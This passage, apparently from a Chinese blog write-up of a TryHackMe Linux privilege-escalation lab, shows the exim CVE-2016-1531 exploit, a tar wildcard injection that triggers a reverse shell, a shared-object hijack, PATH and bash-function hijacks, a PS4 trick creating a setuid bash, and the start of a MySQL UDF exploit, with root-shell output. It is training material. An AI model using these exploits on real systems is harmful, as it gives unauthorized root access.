<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ ls</span><br><span class="line">myvpn.ovpn  shell.elf  tools</span><br><span class="line">user@debian:~$ chmod +x /home/user/shell.elf</span><br><span class="line">user@debian:~$ ls</span><br><span class="line">myvpn.ovpn  shell.elf  tools</span><br><span class="line">user@debian:~$ touch /home/user/--checkpoint=1</span><br><span class="line">user@debian:~$ touch /home/user/--checkpoint-action=exec=shell.elf</span><br><span class="line">user@debian:~$ ls</span><br><span class="line">--checkpoint=1                      myvpn.ovpn  tools</span><br><span class="line">--checkpoint-action=exec=shell.elf  shell.elf</span><br></pre></td></tr></table></figure>

<p><strong>这两个文件就是按照tar执行命令的参数构造的，这样tar就以为这是它的参数，从而反弹shell</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-10-19-249:~/Tools# nc -lvnp 4444</span><br><span class="line">Listening on 0.0.0.0 4444</span><br><span class="line">Connection received on 10.10.150.39 34311</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<h3>SUID/SGID可执行文件提权</h3>

<p><strong>查看所有的SUID和SGID文件</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l &#123;&#125; \; 2&gt; /dev/null            //查看所有的SUID/SGID权限</span><br><span class="line">-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry</span><br><span class="line">-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent</span><br><span class="line">-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo</span><br><span class="line">-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write</span><br><span class="line">-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab</span><br><span class="line">-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit</span><br><span class="line">-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage</span><br><span class="line">-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn</span><br><span class="line">-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall</span><br><span class="line">-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so</span><br><span class="line">-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env</span><br><span class="line">-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2</span><br><span class="line">-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3</span><br><span class="line">-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device</span><br><span class="line">-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown</span><br><span class="line">-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6</span><br><span class="line">-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping</span><br><span class="line">-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount</span><br><span class="line">-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd</span><br><span class="line">-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs</span><br></pre></td></tr></table></figure>

<p>我们看到了并不常见的SUID文件<code>-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3</code>，我们去查找一下关于它的漏洞</p>
<p><img src="/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/3.png" alt="3"></p>
<p><strong>写入我们的机器直接执行</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ cat tools/suid/exim/cve-2016-1531.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CVE-2016-1531 exim &lt;= 4.84-3 <span class="built_in">local</span> root exploit</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">===============================================</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">you can write files as root or force a perl module to</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">load by manipulating the perl environment and running</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">exim with the <span class="string">&quot;perl_startup&quot;</span> arguement -ps.</span> </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># e.g.</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">[fantastic@localhost tmp]$ ./cve-2016-1531.sh</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">[ CVE-2016-1531 <span class="built_in">local</span> root exploit</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sh-4.3<span class="comment"># id</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">uid=0(root) gid=1000(fantastic) <span class="built_in">groups</span>=1000(fantastic)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># -- Hacker Fantastic</span></span> </span><br><span class="line">echo [ CVE-2016-1531 local root exploit</span><br><span class="line">cat &gt; /tmp/root.pm &lt;&lt; EOF</span><br><span class="line">package root;</span><br><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line"></span><br><span class="line">system(&quot;/bin/sh&quot;);</span><br><span class="line">EOF</span><br><span class="line">PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps</span><br><span class="line">user@debian:~$ ./tools/suid/exim/cve-2016-1531.sh </span><br><span class="line">[ CVE-2016-1531 local root exploit</span><br><span class="line">sh-4.1# id</span><br><span class="line">uid=0(root) gid=1000(user) groups=0(root)</span><br><span class="line">sh-4.1# whoami</span><br><span class="line">root</span><br><span class="line">sh-4.1# </span><br></pre></td></tr></table></figure>

<p><strong>SUID和SGID的提权，不只是利用POC，也可以利用命令本身的特性去提权，例如：namp可以利用SUID进行任意文件写入</strong></p>
<h3>SUID/SGID可执行文件提权共享库提权</h3>

<p><strong>SUID 可执行文件易受共享对象注入攻击，下面是示例程序</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l &#123;&#125; \; 2&gt; /dev/null            //查看所有的SUID/SGID权限</span><br><span class="line">-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry</span><br><span class="line">-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent</span><br><span class="line">-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo</span><br><span class="line">-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write</span><br><span class="line">-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab</span><br><span class="line">-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit</span><br><span class="line">-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage</span><br><span class="line">-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn</span><br><span class="line">-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall</span><br><span class="line">-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so</span><br><span class="line">-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env</span><br><span class="line">-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2</span><br><span class="line">-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3</span><br><span class="line">-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device</span><br><span class="line">-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown</span><br><span class="line">-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6</span><br><span class="line">-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping</span><br><span class="line">-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount</span><br><span class="line">-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd</span><br><span class="line">-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs</span><br></pre></td></tr></table></figure>

<p><code>usr/local/bin/suid-so</code><strong>是一个共享库提权的示例程序，我们先执行一下</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ /usr/local/bin/suid-so</span><br><span class="line">Calculating something, please wait...</span><br><span class="line">[=====================================================================&gt;] 99 %</span><br><span class="line">Done.</span><br><span class="line">user@debian:~$ </span><br></pre></td></tr></table></figure>

<p><strong>发现文件没有到100%完成，跟踪文件</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE &quot;open|access|no such file&quot;</span><br><span class="line">access(&quot;/etc/suid-debug&quot;, F_OK)         = -1 ENOENT (No such file or directory)</span><br><span class="line">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/etc/ld.so.cache&quot;, O_RDONLY)      = 3</span><br><span class="line">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/lib/libdl.so.2&quot;, O_RDONLY)       = 3</span><br><span class="line">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/usr/lib/libstdc++.so.6&quot;, O_RDONLY) = 3</span><br><span class="line">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/lib/libm.so.6&quot;, O_RDONLY)        = 3</span><br><span class="line">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/lib/libgcc_s.so.1&quot;, O_RDONLY)    = 3</span><br><span class="line">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/lib/libc.so.6&quot;, O_RDONLY)        = 3</span><br><span class="line">open(&quot;/home/user/.config/libcalc.so&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span><br><span class="line">user@debian:~$ </span><br></pre></td></tr></table></figure>

<p><strong>发现加载一个<code>/home/user/.config/libcalc.so</code>文件，没有找到该文件，那就可以直接劫持了</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ cat /home/user/tools/suid/libcalc.c</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">static void inject() __attribute__((constructor));</span><br><span class="line"></span><br><span class="line">void inject() &#123;</span><br><span class="line">	setuid(0);</span><br><span class="line">	system(&quot;/bin/bash -p&quot;);</span><br><span class="line">&#125;</span><br><span class="line">user@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c</span><br><span class="line">user@debian:~$ /usr/local/bin/suid-so</span><br><span class="line">Calculating something, please wait...</span><br><span class="line">bash-4.1# id</span><br><span class="line">uid=0(root) gid=1000(user) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)</span><br><span class="line">bash-4.1# whoami</span><br><span class="line">root</span><br><span class="line">bash-4.1# </span><br></pre></td></tr></table></figure>

<h3>SUID/SGID可执行文件环境变量提权</h3>

<p><strong>SUID 程序在执行时会继承环境变量，而如果程序没有正确处理这些环境变量，就可能被利用来实现提权或其他恶意行为</strong></p>
<p><strong>我们直接来看给的示例程序<code>/usr/local/bin/suid-env</code></strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ strings /usr/local/bin/suid-env</span><br><span class="line">/lib64/ld-linux-x86-64.so.2</span><br><span class="line">5q;Xq</span><br><span class="line">__gmon_start__</span><br><span class="line">libc.so.6</span><br><span class="line">setresgid</span><br><span class="line">setresuid</span><br><span class="line">system</span><br><span class="line">__libc_start_main</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">fff.</span><br><span class="line">fffff.</span><br><span class="line"><span class="meta prompt_">l$ </span><span class="language-bash">L</span></span><br><span class="line"><span class="meta prompt_">t$</span><span class="language-bash">(L</span></span><br><span class="line">|$0H</span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>

<p><strong>可以看到，这个程序启动了一个apache2服务，但是<code>service</code>命令没有指定完全的路径，可以劫持该命令</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ cat /home/user/tools/suid/service.c</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	setuid(<span class="number">0</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/bash -p&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ gcc -o service /home/user/tools/suid/service.c</span><br><span class="line">user@debian:~$ PATH=.:$PATH</span><br><span class="line">user@debian:~$ /usr/local/bin/suid-env</span><br><span class="line">root@debian:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)</span><br><span class="line">root@debian:~# </span><br></pre></td></tr></table></figure>

<h3>SUID/SGID可执行文件利用shell功能提权</h3>

<p><strong>我们直接来看示例程序<code>/usr/local/bin/suid-env2</code></strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~/tools/privesc-scripts$ strings /usr/local/bin/suid-env2</span><br><span class="line">/lib64/ld-linux-x86-64.so.2</span><br><span class="line">__gmon_start__</span><br><span class="line">libc.so.6</span><br><span class="line">setresgid</span><br><span class="line">setresuid</span><br><span class="line">system</span><br><span class="line">__libc_start_main</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">fff.</span><br><span class="line">fffff.</span><br><span class="line"><span class="meta prompt_">l$ </span><span class="language-bash">L</span></span><br><span class="line"><span class="meta prompt_">t$</span><span class="language-bash">(L</span></span><br><span class="line">|$0H</span><br><span class="line">/usr/sbin/service apache2 start</span><br><span class="line">user@debian:~/tools/privesc-scripts$ </span><br></pre></td></tr></table></figure>

<p><code>/usr/sbin/service apache2 start</code><strong>与上面不同的是，这次的service是全路径的，我们无法通过环境变量提权</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~/tools/privesc-scripts$ /bin/bash --version</span><br><span class="line">GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)</span><br><span class="line">Copyright (C) 2009 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line"></span><br><span class="line">This is free software; you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br></pre></td></tr></table></figure>

<p><strong>在 Bash 版本&lt;4.2-048 中，可以定义与文件路径相似的 shell 函数名，然后导出这些函数，以便它们在该文件路径处代替任何实际的可执行文件。</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~/tools/privesc-scripts$ function /usr/sbin/service &#123; /bin/bash -p; &#125;</span><br><span class="line">user@debian:~/tools/privesc-scripts$ export -f /usr/sbin/service</span><br><span class="line">user@debian:~/tools/privesc-scripts$ /usr/local/bin/suid-env2</span><br><span class="line">root@debian:~/tools/privesc-scripts# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)</span><br><span class="line">root@debian:~/tools/privesc-scripts# </span><br></pre></td></tr></table></figure>

<p><strong>当bash的脚本版本低于4.4的时候，当处于调试模式时，Bash 使用环境变量 PS4 来显示额外的提示以供调试语句使用。</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env -i SHELLOPTS=xtrace PS4=&#x27;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&#x27; /usr/local/bin/suid-env2</span><br></pre></td></tr></table></figure>

<p><strong>需要知道的是，并不是选择任意一个SUID文件就可以执行前面的代码，这和&#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-env2有很大的关系，如果该二进制文件没有执行 Shell 命令，或者在内部调用了不启用调试模式的代码，那么前面的代码就不会执行，文件也不会创建，演示的二进制文件调用了启动apache2的shell命令</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user@debian:/tmp$ ./rootbash -p</span><br><span class="line">rootbash-4.1# whoami</span><br><span class="line">root</span><br><span class="line">rootbash-4.1# </span><br></pre></td></tr></table></figure>

<h3>MySql服务漏洞提权</h3>

<p><strong>如果 MySQL 服务我们能取得立足点，且该立足点有写入插入的权限【root不需担心】，且secure_file_priv参数为空【不为空一般先不要考虑】，我们就可以使用用户定义函数（UDFs）漏洞来达到提权的目的</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  searchsploit MYSQL udf                                                                               [20:53:31]</span><br><span class="line">----------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                 |  Path</span><br><span class="line">----------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)                         | linux/local/1181.c</span><br><span class="line">MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)                        | linux/local/1518.c</span><br><span class="line">MySQL 4.x/5.0 (Windows) - User-Defined Function Command Execution                              | windows/remote/3274.txt</span><br><span class="line">MySQL 4/5/6 - UDF for Command Execution                                                        | linux/local/7856.txt</span><br><span class="line">----------------------------------------------------------------------------------------------- ---------------------------------</span><br></pre></td></tr></table></figure>

<p><strong>是有现成的POC给我们使用的</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="number">1518.</span>c                                                                                           [<span class="number">20</span>:<span class="number">54</span>:<span class="number">24</span>]</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * $Id: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * raptor_udf2.c - dynamic library for do_system() MySQL UDF</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2006 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This is an helper dynamic library for local privilege escalation through</span></span><br><span class="line"><span class="comment"> * MySQL run with root privileges (very bad idea!), slightly modified to work</span></span><br><span class="line"><span class="comment"> * with newer versions of the open-source database. Tested on MySQL 4.1.14.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes</span></span><br><span class="line"><span class="comment"> * for the security vulnerabilities in the handling of User Defined Functions</span></span><br><span class="line"><span class="comment"> * (UDFs) reported by Stefano Di Paola &lt;stefano.dipaola@wisec.it&gt;. For further</span></span><br><span class="line"><span class="comment"> * details, please refer to:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html</span></span><br><span class="line"><span class="comment"> * http://www.wisec.it/vulns.php?page=4</span></span><br><span class="line"><span class="comment"> * http://www.wisec.it/vulns.php?page=5</span></span><br><span class="line"><span class="comment"> * http://www.wisec.it/vulns.php?page=6</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &quot;UDFs should have at least one symbol defined in addition to the xxx symbol</span></span><br><span class="line"><span class="comment"> * that corresponds to the main xxx() function. These auxiliary symbols</span></span><br><span class="line"><span class="comment"> * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and</span></span><br><span class="line"><span class="comment"> * xxx_add() functions&quot;. -- User Defined Functions Security Precautions</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Usage:</span></span><br><span class="line"><span class="comment"> * $ id</span></span><br><span class="line"><span class="comment"> * uid=500(raptor) gid=500(raptor) groups=500(raptor)</span></span><br><span class="line"><span class="comment"> * $ gcc -g -c 